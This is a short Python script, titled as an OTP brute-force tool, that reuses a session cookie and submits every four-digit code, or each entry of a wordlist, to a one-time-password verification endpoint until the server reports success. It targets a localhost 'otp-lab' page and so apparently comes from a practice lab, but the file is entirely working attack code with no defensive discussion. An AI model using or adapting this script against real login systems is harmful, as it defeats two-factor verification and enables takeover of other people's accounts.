import requests
import os

print("\n=== OTP BRUTE FORCE SCRIPT ===\n")
print("\n=== CODING CHAT ROOM ===\n")

cookie = input("Enter PHPSESSID (Browser Cookie): ").strip()

if cookie == "":
    print("Error: Cookie required!")
    exit()

session = requests.Session()
session.cookies.set("PHPSESSID", cookie)


use_wordlist = input("Do you want to use a wordlist? (y/n): ").lower().strip()

url_verify = "http://localhost/otp-lab/verify_otp.php"


if use_wordlist == "y":

    path = input("Enter path to wordlist file: ").strip()

    if not os.path.exists(path):
        print("Error: Wordlist not found!")
        exit()

    print("\n[+] Using wordlist:", path)

    with open(path, "r") as file:
        for line in file:
            otp = line.strip()

            r = session.post(url_verify, data={"otp": otp})
            
            try:
                response = r.json()
            except:
                print("Invalid server response:", r.text)
                continue

            print(f"Trying: {otp}", end="\r")

            if response.get("status") == "success":
                print(f"\n[✔] OTP FOUND: {otp}")
                exit()

    print("\n[-] OTP not found in wordlist.")
    exit()


else:
    print("\n[+] Running default brute-force (1000–9999)...\n")

    for pin in range(1000, 10000):
        otp = str(pin)

        r = session.post(url_verify, data={"otp": otp})

        try:
            response = r.json()
        except:
            print("Invalid server response:", r.text)
            break

        print(f"Trying: {otp}", end="\r")

        if response.get("status") == "success":
            print(f"\n[✔] OTP FOUND: {otp}")
            break

print("\nDone.\n")
